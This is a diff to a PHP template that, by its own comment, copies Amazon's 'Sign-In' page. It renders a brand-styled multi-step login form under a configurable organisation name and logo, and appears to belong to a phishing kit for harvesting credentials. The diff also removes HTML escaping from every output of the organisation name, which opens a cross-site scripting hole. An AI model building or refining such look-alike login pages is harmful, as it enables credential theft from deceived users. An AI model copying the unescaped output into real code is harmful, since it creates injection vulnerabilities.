@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 // Retail template — Amazon style: white, narrow 350px, thin border, orange accent, "Sign-In" heading
 ?>
 <!DOCTYPE html>
@@ -84,9 +84,9 @@ body{font-family:'Amazon Ember',Arial,sans-serif;min-height:100vh;min-height:100
 
 <div class="site-logo">
   <?php if($logo_url):?>
-  <div class="site-logo-box"><img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="site-logo-text" style="display:none"><?=htmlspecialchars($org_name)?></span></div>
+  <div class="site-logo-box"><img src="<?=htmlspecialchars($logo_url)?>" alt="<?=$org_name?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="site-logo-text" style="display:none"><?=$org_name?></span></div>
   <?php else:?>
-  <span class="site-logo-text"><?=htmlspecialchars($org_name)?></span>
+  <span class="site-logo-text"><?=$org_name?></span>
   <?php endif;?>
 </div>
 
@@ -97,7 +97,7 @@ body{font-family:'Amazon Ember',Arial,sans-serif;min-height:100vh;min-height:100
     <div class="step-sub" id="step<?=$sn?>sub" style="<?=$sn>1?'display:block':''?>"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
     <form onsubmit="submitStep(event,<?=$sn?>)">
       <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
-      <div class="legal">By continuing, you agree to <?=htmlspecialchars($org_name)?>'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
+      <div class="legal">By continuing, you agree to <?=$org_name?>'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
       <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
       <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
     </form>
@@ -106,8 +106,8 @@ body{font-family:'Amazon Ember',Arial,sans-serif;min-height:100vh;min-height:100
 
   <div class="section-divider"></div>
   <div class="new-account">
-    <div class="new-account-divider">New to <?=htmlspecialchars($org_name)?>?</div>
-    <button class="create-btn">Create your <?=htmlspecialchars($org_name)?> account</button>
+    <div class="new-account-divider">New to <?=$org_name?>?</div>
+    <button class="create-btn">Create your <?=$org_name?> account</button>
   </div>
 </div>
 
